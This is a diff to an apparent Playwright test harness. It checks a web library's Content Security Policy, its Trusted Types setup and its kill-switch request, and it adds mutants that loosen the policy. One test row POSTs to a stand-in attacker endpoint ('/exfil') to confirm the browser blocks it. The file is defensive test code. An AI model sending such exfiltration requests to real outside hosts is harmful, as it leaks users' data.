@@ -111,7 +111,8 @@ const S_SWAP_KX = ['public/signin.js', 'wdevText({ W: request.W, kx: request.kx,
 // ---- the browser ------------------------------------------------------------------------
 const browser = await chromium.launch({ ...(CHROME ? { channel: 'chrome' } : {}), headless: true })
 console.log(`${CHROME ? 'Google Chrome' : 'Playwright headless shell'} ${browser.version()}`)
-const sockets = [], refused = []
+const sockets = [], refused = [], statusAsked = []
+const STATUS_URL = 'https://bento.page/releases/home/status.json'
 
 const FORGE = `<!doctype html><meta charset=utf-8><title>forge</title><script>
   opener && opener.postMessage({ t: 'cancelled' }, '*')
@@ -136,6 +137,8 @@ async function session(dist, { sEdit = null, account = ADDRESS } = {}) {
 
   await ctx.routeWebSocket(/.*/, (ws) => { sockets.push(ws.url()); ws.close() })
   await ctx.route('**/*', (route) => { refused.push(route.request().url()); return route.abort() })
+  // the kill switch's one question per load (home/web/src/offline.ts): unanswered, so the library carries on
+  await ctx.route(STATUS_URL, (route) => { statusAsked.push(route.request().url()); return route.fulfill({ status: 404, body: '' }) })
   await ctx.route(`${HOME}/**`, (route) => {
     const p = new URL(route.request().url()).pathname
     if (p !== '/' && p !== '/index.html') return route.fulfill({ status: 404, body: '' })
@@ -769,14 +772,17 @@ const ROWS = {
     const sent = await st.page.evaluate((u) => fetch(u, { method: 'POST', body: 'x' }).then(() => 'sent', (e) => e.name), ATTACKER + '/exfil')
     await sleep(200)
     const tt = await st.page.evaluate(() => { try { document.getElementById('id-text').innerHTML = '<b>x</b>'; return 'assigned' } catch (e) { return e.name } })
+    const otherPolicy = await st.page.evaluate(() => { try { trustedTypes.createPolicy('not-the-worker', {}); return 'created' } catch (e) { return e.name } })
     await close(st)
     return [
       [/connect-src https:\/\/bento\.page\/releases\/ https:\/\/id\.bento\.page;/.test(info.libraryPolicy) && hdr.includes('connect-src https://bento.page/releases/ https://id.bento.page;'),
         'connect-src is exactly the release channel and the directory, in the meta policy and the header'],
-      [/require-trusted-types-for 'script'; trusted-types 'none'/.test(info.libraryPolicy) && /frame-ancestors 'none'/.test(hdr) && /Cross-Origin-Opener-Policy: same-origin-allow-popups/.test(hdr),
-        "Trusted Types required with no policy; frame-ancestors 'none'; COOP same-origin-allow-popups (never same-origin: it would cut the sign-in window off)"],
+      // one Trusted Types policy since stage 3: bento-sw, which passes only the worker's URL to register()
+      [/require-trusted-types-for 'script'; trusted-types bento-sw(;|$)/m.test(info.libraryPolicy) && (hdr.match(/trusted-types [^;\n]*/g) ?? []).every((d) => d === 'trusted-types bento-sw') && /trusted-types bento-sw;/.test(hdr) && /frame-ancestors 'none'/.test(hdr) && /Cross-Origin-Opener-Policy: same-origin-allow-popups/.test(hdr),
+        "Trusted Types required with one policy (bento-sw, the worker URL only); frame-ancestors 'none'; COOP same-origin-allow-popups (never same-origin: it would cut the sign-in window off)"],
       [sent === 'TypeError' && st.attackerHits.length === 0, `a request to another site is blocked before it leaves (${sent}, ${st.attackerHits.length} seen)`],
       [tt === 'TypeError', `a markup sink throws (${tt})`],
+      [otherPolicy === 'TypeError', `no other Trusted Types policy can be made (${otherPolicy})`],
     ]
   },
 }
@@ -839,6 +845,8 @@ const MUTANTS = {
     A('identity.ts', "else if (!(await this.end(held.address, 'invalid', held.Wpub))) return this.load()", "else if (!(await this.end(held.address, 'invalid', undefined as any))) return this.load()")]],
   'connect-any': ['the policy: the release channel and the directory only, Trusted Types required', 'dist',
     (t) => t.replace('connect-src https://bento.page/releases/ https://id.bento.page', 'connect-src *')],
+  'tt-any-policy': ['the policy: the release channel and the directory only, Trusted Types required', 'dist',
+    (t) => t.replaceAll('trusted-types bento-sw', "trusted-types bento-sw 'allow-duplicates' *")],
 }
 
 const rowHolds = async (name, dist, edits = null) => {
@@ -857,6 +865,7 @@ try {
     console.log('\nisolation')
     ok(sockets.length === 0, `no WebSocket was opened (${sockets.length})`)
     ok(refused.length === 0, `nothing was fetched outside the routed origins (${JSON.stringify(refused.slice(0, 5))})`)
+    ok(statusAsked.length > 0, `the library asked the release channel for its kill-switch status, the one request it makes on load (${statusAsked.length} times)`)
   } else {
     const names = ONLY && !ONLY.startsWith('--') ? [ONLY] : Object.keys(MUTANTS)
     for (const m of names) {
